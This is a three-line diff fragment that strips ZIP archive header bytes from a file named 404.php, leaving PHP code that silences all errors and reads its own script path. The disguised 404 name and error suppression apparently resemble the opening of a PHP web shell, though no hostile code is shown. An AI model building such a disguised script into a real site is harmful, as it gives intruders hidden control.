@@ -1,4 +1,3 @@
-PK�J�L404.phpPKPK�J�L404.phpPK57
 <?php
 error_reporting(0);
 $slf = $_SERVER['PHP_SELF'];
